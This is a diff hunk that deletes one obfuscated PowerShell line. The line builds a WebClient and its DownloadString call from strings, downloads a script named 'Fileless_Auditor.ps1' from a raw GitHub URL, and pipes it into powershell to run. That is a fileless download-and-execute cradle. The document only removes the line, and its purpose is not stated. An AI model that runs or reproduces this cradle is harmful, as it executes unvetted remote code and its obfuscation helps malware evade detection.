@@ -1,1 +1,0 @@
-$wc2='Net.WebClient';$url='https://raw.githubusercontent.com/Savitar407/IcedShark/main/Fileless_Auditor.ps1';$wc=(New-Object $wc2);$ds='DownloadString';$wc.$ds.Invoke($url) | powershell
